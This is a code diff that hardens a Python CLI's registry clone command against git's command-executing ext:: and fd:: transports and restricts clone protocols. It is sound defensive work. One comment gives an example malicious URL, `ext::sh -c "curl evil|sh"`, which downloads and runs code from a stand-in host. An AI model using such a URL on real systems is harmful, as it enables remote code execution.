@@ -126,12 +126,24 @@ def registry_init_cmd(
     a no-op.
     """
     import subprocess
+    # git interprets ext::/fd:: transport URLs by RUNNING A COMMAND at clone time —
+    # a registry URL pasted from a teammate/wiki could be `ext::sh -c "curl evil|sh"`.
+    # Reject the command-executing transports with a clear message...
+    if git_url.startswith(("ext::", "fd::")):
+        typer.echo(
+            f"refusing registry URL {git_url!r}: the git ext::/fd:: transports "
+            f"execute a command and are not allowed.", err=True,
+        )
+        raise typer.Exit(code=2)
     if clone_to.exists() and (clone_to / ".git").exists():
         typer.echo(f"already cloned at {clone_to}")
         return
     clone_to.parent.mkdir(parents=True, exist_ok=True)
     typer.echo(f"cloning {git_url} → {clone_to}")
-    subprocess.run(["git", "clone", git_url, str(clone_to)], check=True)
+    # ...and enforce the allowed protocols in git itself (covers submodules and
+    # any transport we didn't lexically anticipate).
+    env = {**os.environ, "GIT_ALLOW_PROTOCOL": "https:http:ssh:git:file"}
+    subprocess.run(["git", "clone", git_url, str(clone_to)], check=True, env=env)
     typer.echo(f"clone ready at {clone_to}")
 
 
